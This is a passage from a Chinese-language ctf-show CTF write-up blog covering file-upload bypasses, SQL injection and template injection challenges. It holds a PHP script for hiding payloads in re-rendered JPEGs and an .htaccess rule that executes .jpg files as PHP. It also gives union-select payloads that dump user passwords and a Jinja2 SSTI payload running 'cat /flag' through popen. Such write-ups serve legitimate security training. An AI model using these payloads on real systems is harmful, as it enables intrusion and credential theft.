file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = strlen(<span class="keyword">$this</span>-&gt;binData);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">seek</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> (<span class="keyword">$this</span>-&gt;size - strlen(<span class="keyword">$this</span>-&gt;binData));</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">skip</span>(<span class="params"><span class="variable">$skip</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="variable">$skip</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readByte</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;eof()) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$byte</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">1</span>);</span><br><span class="line">            <span class="keyword">return</span> ord(<span class="variable">$byte</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">readShort</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">if</span>(strlen(<span class="keyword">$this</span>-&gt;binData) &lt; <span class="number">2</span>) &#123;</span><br><span class="line">                <span class="keyword">die</span>(<span class="string">&#x27;End Of File&#x27;</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="variable">$short</span> = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">0</span>, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = substr(<span class="keyword">$this</span>-&gt;binData, <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;order) &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">1</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">0</span>]);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="variable">$short</span> = (ord(<span class="variable">$short</span>[<span class="number">0</span>]) &lt;&lt; <span class="number">8</span>) + ord(<span class="variable">$short</span>[<span class="number">1</span>]);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$short</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">eof</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> !<span class="keyword">$this</span>-&gt;binData||(strlen(<span class="keyword">$this</span>-&gt;binData) === <span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>运行第一次渲染的图片：1.jpg </p>
<p><code>php jpg_payload.php 1.jpg</code>进行二次修改</p>
<p>然后上传就可以看到需要的代码被写进去</p>
<h3 id="web-166"><a href="#web-166" class="headerlink" title="web 166"></a>web 166</h3><p>只能上传zip格式，不仅前端后端也有过滤，所以只能上传zip格式，将zip用文本格式打开，在里面添加我们的一句话木马，这样就可以直接运行一句话木马</p>
<h3 id="web-167"><a href="#web-167" class="headerlink" title="web 167"></a>web 167</h3><p>有个提示：httpd</p>
<p>以为意味这我们可以通过.htaccess文件修改主配置文件,我们直接修改，因为他只能上传jpg文件所以我们让他将jpg文件用php语言执行，</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AddType application/x-httpd-php .jpg</span><br></pre></td></tr></table></figure>

<p>需要抓包修改文件类型上传，需要修改成jpeg文件上传</p>
<h3 id="web-168"><a href="#web-168" class="headerlink" title="web 168"></a>web 168</h3><p>基础免杀，上传了png文件抓包可以修改后缀上传，可以发现上传成功，访问也可以正确回显，我们在其中插入phpinfo可以执行</p>
<p>但是如果是eval还有system就会显示null，那么就用反引号还有=号构造系统命令上传，可以执行</p>
<h3 id="web-169"><a href="#web-169" class="headerlink" title="web 169"></a>web 169</h3><p>发现文件页面的检查是zip文件，上传之后发现只有png文件可以上传，然后还过滤了<code>&lt;</code>那么构造php文件的方式就没办法了，但是他是可以新建文件的，如果我们上传文件1.php内容为123她会自动新建一个页面，那么我们在upload文件夹新建一个index.php文件然后用user.ini文件修改配置让他包含日志文件，这样的话我们直接在User-Agent头写入一句话木马，然后在这个页面执行就行</p>
<h3 id="web-170"><a href="#web-170" class="headerlink" title="web 170"></a>web 170</h3><p>同上，但是nl还有tac命令用的时候不知道出现了什么问题（太菜了没找到），最后用cat也能拿到flag就是了</p>
<h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><h3 id="web-171"><a href="#web-171" class="headerlink" title="web 171"></a>web 171</h3><p>没有任何过滤那应该在这张表里面，直接用</p>
<p><code>1&#39;or&#39;1&#39;=&#39;1</code>即可拿到表单的所有信息</p>
<p>（也可以直接查询）</p>
<h3 id="web-172"><a href="#web-172" class="headerlink" title="web 172"></a>web 172</h3><p>添加了限制条件，上面的不能用了，还是单引号闭合，直接联合查询</p>
<p>最终payload：</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select 1,(select password from ctfshow_user2 where username = flag);--+</span><br><span class="line">或者直接爆他所有的内容。</span><br><span class="line">-1&#x27;union select 1,group_concat(&#x27;~&#x27;,username,&#x27;:&#x27;,password) from ctfshow_user2;--+</span><br></pre></td></tr></table></figure>

<h3 id="web-173"><a href="#web-173" class="headerlink" title="web 173"></a>web 173</h3><p>对username进一步过滤，flag不能出现，那么我们直接爆出password所有内容就行</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1&#x27;union select 1,2,(select group_concat(&#x27;~&#x27;,password) from ctfshow_user3);--+</span><br></pre></td></tr></table></figure>

<h3 id="web-174"><a href="#web-174" class="headerlink" title="web 174"></a>web 174</h3><h2 id="SSTI"><a href="#SSTI" class="headerlink" title="SSTI"></a>SSTI</h2><h3 id="web-361"><a href="#web-361" class="headerlink" title="web 361"></a>web 361</h3><p>这里跳了一下，看一下模板，ssti</p>
<p>题目的提示：名字就是提示，我们只需要在网页的后面以get方式传入一个值就行了</p>
<p>既然是ssti那么我们直接测试一下49看一下</p>
<p>如果返回的是7777777那么就是jinjia2</p>
<p>如果返回的是49那么就是twig</p>
<p>成功返回了49，那就肯定了就是这里。</p>
<p>那么我们直接开始调用里面的魔术方法</p>
<p><code>&#39;&#39;.__class__.__mro__</code>可以看到object类在2那么数组就是1，然后我们进去看一看它里面的类</p>
<p><code>&#39;&#39;.__class__.__mro__[1].__subclasses__()</code>可以看到回显了很多类，我们查找可以执行os命令的类</p>
<p>找到了在133，那么数组就是132我们直接调用初始化，然后globals全局来查找可以使用的方法及变量参数</p>
<p>这里面os是空的，继续找，找到popen</p>
<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?name=&#123;&#123;&#x27;&#x27;.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /flag&#x27;).read()&#125;&#125;</span><br></pre></td></tr></table></figure>




        </div>

        
            <div class="post-copyright-info">
                <div class="article-copyright-info-container">
    <ul>
        <li>Post title：ctf-show(爆破-命令执行-php特性-文件上传-sql注入)</li>
        <li>Post author：paixiaoxing</li>
        <li>Create time：2022-02-22 11:11:39</li>
        <li>
            Post link：https://keep.xpoet.cn/2022/02/22/ctf-show(爆破-命令执行-文件上传-sql注入-php特性)/
        </li>
        <li>
            Copyright Notice：All articles in this blog are licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">BY-NC-SA</a> unless stating additionally.
        </li>
    </ul>
</div>

            </div>
        

        
            <ul class="post-tags-box">
                
                    <li class="tag-item">
                        <a href="/tags/ctf-show/">#ctf-show</a>&nbsp;
                    </li>
                
            </ul>
        

        
            <div class="article-nav">
                
                    <div class="article-prev">
                        <a class="prev"
                           rel="prev"
                           href="/2022/02/28/Unicorn-shop/"
                        >
                            <span class="left arrow-icon flex-center">
                              <i class="fas fa-chevron-left"></i>
                            </span>
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Unicorn shop</span>
                                <span class="post-nav-item">Prev posts</span>
                            </span>
                        </a>
                    </div>
                
                
                    <div class="article-next">
                        <a class="next"
                           rel="next"
                           href="/2022/02/15/Newcalc0/"
                        >
                            <span class="title flex-center">
                                <span class="post-nav-title-item">Newcalc0</span>
                                <span class="post-nav-item">Next posts</span>
                            </span>
                            <span class="right arrow-icon flex-center">
                              <i class="fas fa-chevron-right"></i>
                            </span>
                        </a>
                    </div>
                
            </div>
        

        
    </div>
</div>


                
            </div>

        </div>

        <div class="page-main-content-bottom">
            <footer class="footer">
    <div class="info-container">
        <div class="copyright-info info-item">
            &copy;
            
              <span>2020</span>
              -
            
            2022&nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;<a href="/">paixiaoxing</a>
        </div>
        
            <script async  src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
            <div class="website-count info-item">
                
                    <span id="busuanzi_container_site_uv">
                        Visitor Count&nbsp;<span id="busuanzi_value_site_uv"></span>&ensp;
                    </span>
                
                
                    <span id="busuanzi_container_site_pv">
                        Totalview&nbsp;<span id="busuanzi_value_site_pv"></span>
                    </span>
                
            </div>
        
        <div class="theme-info info-item">
            Powered by <a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;|&nbsp;Theme&nbsp;<a class="theme-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep v3.4.5</a>
        </div>
        
        
    </div>
</footer>

        </div>
    </div>

    
        <div class="post-tools">
            <div class="post-tools-container">
    <ul class="tools-list">
        <!-- TOC aside toggle -->
        
            <li class="tools-item page-aside-toggle">
                <i class="fas fa-outdent"></i>
            </li>
        

        <!-- go comment -->
        
    </ul>
</div>

        </div>
    

    <div class="right-bottom-side-tools">
        <div class="side-tools-container">
    <ul class="side-tools-list">
        <li class="tools-item tool-font-adjust-plus flex-center">
            <i class="fas fa-search-plus"></i>
        </li>

        <li class="tools-item tool-font-adjust-minus flex-center">
            <i class="fas fa-search-minus"></i>
        </li>

        <li class="tools-item tool-expand-width flex-center">
            <i class="fas fa-arrows-alt-h"></i>
        </li>

        <li class="tools-item tool-dark-light-toggle flex-center">
            <i class="fas fa-moon"></i>
        </li>

        <!-- rss -->
        

        

        <li class="tools-item tool-scroll-to-bottom flex-center">
            <i class="fas fa-arrow-down"></i>
        </li>
    </ul>

    <ul class="exposed-tools-list">
        <li class="tools-item tool-toggle-show flex-center">
            <i class="fas fa-cog fa-spin"></i>
        </li>
        
            <li class="tools-item tool-scroll-to-top flex-center">
                <i class="arrow-up fas fa-arrow-up"></i>
                <span class="percent"></span>
            </li>
        
    </ul>
</div>

    </div>

    
        <aside class="page-aside">
            <div class="post-toc-wrap">
    <div class="post-toc">
        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#%E7%88%86%E7%A0%B4"><span class="nav-number">1.</span> <span class="nav-text">爆破</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web27"><span class="nav-number">1.1.</span> <span class="nav-text">web27</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-28"><span class="nav-number">1.2.</span> <span class="nav-text">web 28</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="nav-number">2.</span> <span class="nav-text">命令执行</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web29"><span class="nav-number">2.1.</span> <span class="nav-text">web29</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web30"><span class="nav-number">2.2.</span> <span class="nav-text">web30</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web31"><span class="nav-number">2.3.</span> <span class="nav-text">web31</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web32"><span class="nav-number">2.4.</span> <span class="nav-text">web32</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web33"><span class="nav-number">2.5.</span> <span class="nav-text">web33</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web34"><span class="nav-number">2.6.</span> <span class="nav-text">web34</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web35"><span class="nav-number">2.7.</span> <span class="nav-text">web35</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web36"><span class="nav-number">2.8.</span> <span class="nav-text">web36</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web37"><span class="nav-number">2.9.</span> <span class="nav-text">web37</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web38"><span class="nav-number">2.10.</span> <span class="nav-text">web38</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web39"><span class="nav-number">2.11.</span> <span class="nav-text">web39</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web40"><span class="nav-number">2.12.</span> <span class="nav-text">web40</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web41"><span class="nav-number">2.13.</span> <span class="nav-text">web41</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web42"><span class="nav-number">2.14.</span> <span class="nav-text">web42</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-43"><span class="nav-number">2.15.</span> <span class="nav-text">web 43</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-44"><span class="nav-number">2.16.</span> <span class="nav-text">web 44</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-45"><span class="nav-number">2.17.</span> <span class="nav-text">web 45</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-46"><span class="nav-number">2.18.</span> <span class="nav-text">web 46</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-47"><span class="nav-number">2.19.</span> <span class="nav-text">web 47</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-48"><span class="nav-number">2.20.</span> <span class="nav-text">web 48</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-49"><span class="nav-number">2.21.</span> <span class="nav-text">web 49</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-50"><span class="nav-number">2.22.</span> <span class="nav-text">web 50</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-51"><span class="nav-number">2.23.</span> <span class="nav-text">web 51</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-52"><span class="nav-number">2.24.</span> <span class="nav-text">web 52</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-53"><span class="nav-number">2.25.</span> <span class="nav-text">web 53</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-54"><span class="nav-number">2.26.</span> <span class="nav-text">web 54</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-55"><span class="nav-number">2.27.</span> <span class="nav-text">web 55</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-56"><span class="nav-number">2.28.</span> <span class="nav-text">web 56</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-57"><span class="nav-number">2.29.</span> <span class="nav-text">web 57</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-58"><span class="nav-number">2.30.</span> <span class="nav-text">web 58</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-59"><span class="nav-number">2.31.</span> <span class="nav-text">web 59</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-60"><span class="nav-number">2.32.</span> <span class="nav-text">web 60</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-61-65"><span class="nav-number">2.33.</span> <span class="nav-text">web 61-65</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web66"><span class="nav-number">2.34.</span> <span class="nav-text">web66</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-67"><span class="nav-number">2.35.</span> <span class="nav-text">web 67</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-68"><span class="nav-number">2.36.</span> <span class="nav-text">web 68</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-69-70"><span class="nav-number">2.37.</span> <span class="nav-text">web 69-70</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-71"><span class="nav-number">2.38.</span> <span class="nav-text">web 71</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-72"><span class="nav-number">2.39.</span> <span class="nav-text">web 72</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-73"><span class="nav-number">2.40.</span> <span class="nav-text">web 73</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-74"><span class="nav-number">2.41.</span> <span class="nav-text">web 74</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-75-76"><span class="nav-number">2.42.</span> <span class="nav-text">web 75-76</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web77"><span class="nav-number">2.43.</span> <span class="nav-text">web77</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-118"><span class="nav-number">2.44.</span> <span class="nav-text">web 118</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-119"><span class="nav-number">2.45.</span> <span class="nav-text">web 119</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-120"><span class="nav-number">2.46.</span> <span class="nav-text">web 120</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-122"><span class="nav-number">2.47.</span> <span class="nav-text">web 122</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-124"><span class="nav-number">2.48.</span> <span class="nav-text">web 124</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E2%80%94%E2%80%94%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%93%E6%9D%9F%E2%80%94%E2%80%94"><span class="nav-number">3.</span> <span class="nav-text">——命令执行结束——</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0"><span class="nav-number">4.</span> <span class="nav-text">文件上传</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#web-78"><span class="nav-number">4.1.</span> <span class="nav-text">web 78</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-79"><span class="nav-number">4.2.</span> <span class="nav-text">web 79</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-80"><span class="nav-number">4.3.</span> <span class="nav-text">web 80</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-81"><span class="nav-number">4.4.</span> <span class="nav-text">web 81</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-82-86"><span class="nav-number">4.5.</span> <span class="nav-text">web 82-86</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-87"><span class="nav-number">4.6.</span> <span class="nav-text">web 87</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-88"><span class="nav-number">4.7.</span> <span class="nav-text">web 88</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-116"><span class="nav-number">4.8.</span> <span class="nav-text">web 116</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-117"><span class="nav-number">4.9.</span> <span class="nav-text">web 117</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#ucs-2%E7%BC%96%E7%A0%81"><span class="nav-number">4.9.1.</span> <span class="nav-text">ucs-2编码</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E2%80%94%E2%80%94-%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E4%B9%9F%E7%BB%93%E6%9D%9F%E4%BA%86%E2%80%94%E2%80%94"><span class="nav-number">4.10.</span> <span class="nav-text">——-文件包含也结束了——-</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#php%E7%89%B9%E6%80%A7"><span class="nav-number">5.</span> <span class="nav-text">php特性</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#web-89"><span class="nav-number">5.0.1.</span> <span class="nav-text">web 89</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-90"><span class="nav-number">5.1.</span> <span class="nav-text">web 90</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-91"><span class="nav-number">5.2.</span> <span class="nav-text">web 91</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-92-93"><span class="nav-number">5.3.</span> <span class="nav-text">web 92-93</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-94"><span class="nav-number">5.4.</span> <span class="nav-text">web 94</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-95"><span class="nav-number">5.5.</span> <span class="nav-text">web 95</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-96"><span class="nav-number">5.6.</span> <span class="nav-text">web 96</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-97"><span class="nav-number">5.7.</span> <span class="nav-text">web 97</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-98"><span class="nav-number">5.8.</span> <span class="nav-text">web 98</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-99"><span class="nav-number">5.9.</span> <span class="nav-text">web 99</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-100"><span class="nav-number">5.10.</span> <span class="nav-text">web 100</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-101"><span class="nav-number">5.11.</span> <span class="nav-text">web 101</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-102"><span class="nav-number">5.12.</span> <span class="nav-text">web 102</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-103"><span class="nav-number">5.13.</span> <span class="nav-text">web 103</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-104"><span class="nav-number">5.14.</span> <span class="nav-text">web 104</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-105"><span class="nav-number">5.15.</span> <span class="nav-text">web 105</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-106"><span class="nav-number">5.16.</span> <span class="nav-text">web 106</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-107"><span class="nav-number">5.17.</span> <span class="nav-text">web 107</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-108"><span class="nav-number">5.18.</span> <span class="nav-text">web 108</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-109"><span class="nav-number">5.19.</span> <span class="nav-text">web 109</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-110"><span class="nav-number">5.20.</span> <span class="nav-text">web 110</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-111"><span class="nav-number">5.21.</span> <span class="nav-text">web 111</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-112"><span class="nav-number">5.22.</span> <span class="nav-text">web 112</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-113"><span class="nav-number">5.23.</span> <span class="nav-text">web 113</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-114"><span class="nav-number">5.24.</span> <span class="nav-text">web 114</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-115"><span class="nav-number">5.25.</span> <span class="nav-text">web 115</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-123"><span class="nav-number">5.26.</span> <span class="nav-text">web 123</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-125"><span class="nav-number">5.27.</span> <span class="nav-text">web 125</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-126"><span class="nav-number">5.28.</span> <span class="nav-text">web 126</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-127"><span class="nav-number">5.29.</span> <span class="nav-text">web 127</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-128"><span class="nav-number">5.30.</span> <span class="nav-text">web 128</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-129"><span class="nav-number">5.31.</span> <span class="nav-text">web 129</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-130"><span class="nav-number">5.32.</span> <span class="nav-text">web 130</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-131"><span class="nav-number">5.33.</span> <span class="nav-text">web 131</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-132"><span class="nav-number">5.34.</span> <span class="nav-text">web 132</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-133"><span class="nav-number">5.35.</span> <span class="nav-text">web 133</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-134"><span class="nav-number">5.36.</span> <span class="nav-text">web 134</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-135"><span class="nav-number">5.37.</span> <span class="nav-text">web 135</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-136"><span class="nav-number">5.38.</span> <span class="nav-text">web 136</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-137"><span class="nav-number">5.39.</span> <span class="nav-text">web 137</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-138"><span class="nav-number">5.40.</span> <span class="nav-text">web 138</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-139"><span class="nav-number">5.41.</span> <span class="nav-text">web 139</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-140"><span class="nav-number">5.42.</span> <span class="nav-text">web 140</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-141"><span class="nav-number">5.43.</span> <span class="nav-text">web 141</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#web-142"><span class="nav-number">5.44.</span> <span 